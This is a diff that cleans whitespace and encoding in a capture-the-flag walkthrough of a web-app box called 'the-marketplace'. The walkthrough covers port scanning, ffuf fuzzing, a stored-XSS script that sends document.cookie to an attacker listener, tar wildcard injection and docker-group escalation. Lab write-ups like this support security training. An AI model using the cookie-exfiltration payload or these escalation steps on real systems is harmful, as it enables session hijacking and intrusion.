@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 
 
 
@@ -47,34 +47,34 @@ There we go, we got XSS, we can fuzz to check if there's an admin resource anywh
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.239.175/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.239.175/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.239.175/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-new                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 225ms]
-images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 241ms]
-login                   [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 429ms]
-                        [Status: 200, Size: 1785, Words: 418, Lines: 66, Duration: 603ms]
-signup                  [Status: 200, Size: 667, Words: 159, Lines: 31, Duration: 477ms]
-admin                   [Status: 403, Size: 392, Words: 75, Lines: 22, Duration: 393ms]
-Login                   [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 361ms]
-messages                [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 336ms]
+new [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 225ms]
+images [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 241ms]
+login [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 429ms]
+ [Status: 200, Size: 1785, Words: 418, Lines: 66, Duration: 603ms]
+signup [Status: 200, Size: 667, Words: 159, Lines: 31, Duration: 477ms]
+admin [Status: 403, Size: 392, Words: 75, Lines: 22, Duration: 393ms]
+Login [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 361ms]
+messages [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 336ms]
 ```
 
 Let's begin exploitation.
@@ -91,7 +91,7 @@ We can check that we can report listing to admins, meaning that an admin user co
 
 ```
 <script>
-  fetch('http://10.6.34.159:8000/?cookie=' + document.cookie);
+ fetch('http://10.6.34.159:8000/?cookie=' + document.cookie);
 </script>
 ```
 
@@ -190,10 +190,10 @@ If we check our sudo privileges, we can see this:
 ```
 jake@the-marketplace:~$ sudo -l
 Matching Defaults entries for jake on the-marketplace:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User jake may run the following commands on the-marketplace:
-    (michael) NOPASSWD: /opt/backups/backup.sh
+ (michael) NOPASSWD: /opt/backups/backup.sh
 ```
 
 We can check the file:
@@ -205,7 +205,7 @@ echo "Backing up files...";
 tar cf /opt/backups/backup.tar *
 ```
 
-- **Vulnerability**: TheÂ `*`Â wildcard inÂ `tar cf /opt/backups/backup.tar *`Â is dangerous. If we control the files in the directory where the script runs, we can inject malicious filenames to execute code.
+- **Vulnerability**: The`*` wildcard in`tar cf /opt/backups/backup.tar *` is dangerous. If we control the files in the directory where the script runs, we can inject malicious filenames to execute code.
 
 Let's do the following:
 
@@ -250,7 +250,7 @@ export BASH=bash
 
 ![Pasted image 20250331170920.png](../../IMAGES/Pasted%20image%2020250331170920.png)
 
-TheÂ `docker`Â group membership (GID 999) grantsÂ **root-equivalent privileges**Â on the host system. We can exploit this to escalate into root, let's search gtfobins:
+The`docker` group membership (GID 999) grants **root-equivalent privileges** on the host system. We can exploit this to escalate into root, let's search gtfobins:
 
 ![Pasted image 20250331172216.png](../../IMAGES/Pasted%20image%2020250331172216.png)
 
